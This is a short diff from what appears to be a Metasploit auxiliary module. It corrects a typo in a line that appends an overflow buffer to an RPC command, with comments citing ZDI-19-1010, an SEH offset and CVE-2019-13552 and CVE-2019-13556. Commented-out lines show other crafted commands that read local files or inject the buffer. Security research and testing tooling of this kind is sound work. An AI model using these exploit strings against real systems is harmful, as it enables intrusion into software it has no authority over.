@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
      command << NDR.long(0x2711)
      command << NDR.long(0x204)
      command << NDR.long(0x204)
-     commmand << "bwopcbs #{buff}" # ZDI-19-1010  / SEH @ 888/892
+     command << "bwopcbs #{buff}" # ZDI-19-1010  / SEH @ 888/892
      #command << "bwdlgpup 1 1 c:\\cat.txt" # CVE-2019-13552
      #command << "bwgetval c:\\hi.txt" # CVE-2019-13552 
      #command << "cnvlgxtag test,test,test,test,test,#{buff},test" # CVE-2019-13556
